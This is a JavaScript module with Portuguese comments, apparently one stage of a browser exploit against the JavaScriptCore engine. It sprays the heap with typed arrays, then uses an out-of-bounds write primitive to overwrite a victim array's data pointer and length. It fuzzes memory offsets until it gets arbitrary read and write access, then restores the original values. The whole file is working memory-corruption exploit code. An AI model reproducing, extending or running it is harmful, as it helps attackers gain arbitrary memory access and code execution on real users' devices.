// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R47 - Fuzzer Estável)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    getOOBDataView // NOVO: Precisamos de acesso direto ao DataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_STABLE_FUZZER_R47 = "Heisenbug_StableOffsetFuzzer_R47";

// NOVO: Função de leitura síncrona "leve" que não desestabiliza o heap.
function sync_oob_read_32(dataview, offset) {
    if (!dataview) return 0;
    // Lê um inteiro de 32 bits (4 bytes) no offset especificado.
    return dataview.getUint32(offset, true); // true para little-endian
}

export async function executeStableOffsetFuzzer_R47() {
    const FNAME_CURRENT_TEST = FNAME_MODULE_STABLE_FUZZER_R47;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Buscando Offset com Fuzzer Estável ---`, "test", FNAME_CURRENT_TEST);
    
    let result = { success: false, msg: "Fuzzer não encontrou um offset válido.", errorOccurred: null };
    let victim_array = null;

    try {
        // --- FASE 0: PREPARAÇÃO ---
        logS3(`--- Fase 0 (R47): Preparação do Heap e Ambiente OOB ---`, "subtest", FNAME_CURRENT_TEST);
        let spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push(new Uint32Array(32));
        }
        victim_array = new Uint32Array(32);
        spray = null;
        logS3(`[R47] Heap preparado. Array vítima criado.`, 'info');
        
        // Configura o OOB e obtém o DataView para uso síncrono.
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });
        const oob_dataview = getOOBDataView();
        if (!oob_dataview) {
            throw new Error("Não foi possível obter o DataView da primitiva OOB.");
        }
        logS3(`[R47] Ambiente OOB configurado UMA VEZ.`, 'info');
        
        // --- FASE 1: LOOP DE FUZZING ESTÁVEL ---
        logS3(`--- Fase 1 (R47): Iniciando Loop de Fuzzing Estável ---`, "subtest", FNAME_CURRENT_TEST);

        const M_VECTOR_OFFSET = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const M_LENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        const FUZZ_START_OFFSET = 0x20;
        const FUZZ_END_OFFSET = 0x800; // Aumentei a faixa de busca
        const FUZZ_STEP = 0x4;

        for (let offset_guess = FUZZ_START_OFFSET; offset_guess < FUZZ_END_OFFSET; offset_guess += FUZZ_STEP) {
            
            const vector_write_target = offset_guess + M_VECTOR_OFFSET;
            const length_write_target = offset_guess + M_LENGTH_OFFSET;

            // 1. Salva os valores originais de forma SÍNCRONA
            const original_vector_low = sync_oob_read_32(oob_dataview, vector_write_target);
            const original_vector_high = sync_oob_read_32(oob_dataview, vector_write_target + 4);
            const original_length = sync_oob_read_32(oob_dataview, length_write_target);
            
            // 2. Tenta a corrupção
            oob_write_absolute(vector_write_target, 0x0, 4);
            oob_write_absolute(vector_write_target + 4, 0x0, 4);
            oob_write_absolute(length_write_target, 0x7FFFFFFF, 4);

            // 3. Auto-teste
            const TEST_ADDRESS = 0x100000;
            const TEST_VALUE = 0xDEADBEEF;
            const test_index = TEST_ADDRESS / 4;
            
            // Adicionado um try/catch aqui pois uma corrupção errada pode travar o acesso.
            let read_back_value = -1;
            try {
                victim_array[test_index] = TEST_VALUE;
                read_back_value = victim_array[test_index];
            } catch (e) {
                // Ignora erros, pois são esperados em offsets errados.
            }
            
            // 4. Restaura a memória de forma SÍNCRONA
            oob_write_absolute(vector_write_target, original_vector_low, 4);
            oob_write_absolute(vector_write_target + 4, original_vector_high, 4);
            oob_write_absolute(length_write_target, original_length, 4);
            
            // 5. Verifica o resultado do teste
            if (read_back_value === TEST_VALUE) {
                result.success = true;
                result.msg = `Offset funcional encontrado: ${toHex(offset_guess)}`;
                logS3(`[Fuzzer] SUCESSO! ${result.msg}`, 'vuln');
                break; // Encontrou, sai do loop
            }
        }

        if (!result.success) {
             throw new Error(`Fuzzer completou a faixa de ${toHex(FUZZ_START_OFFSET)} a ${toHex(FUZZ_END_OFFSET)} sem encontrar um offset válido.`);
        }

    } catch (e_outer) {
        result.errorOccurred = e_outer;
        result.msg = e_outer.message;
        logS3(`  CRITICAL ERROR (R47): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
        console.error("Outer error in R47 Fuzzer:", e_outer);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
    return result;
}
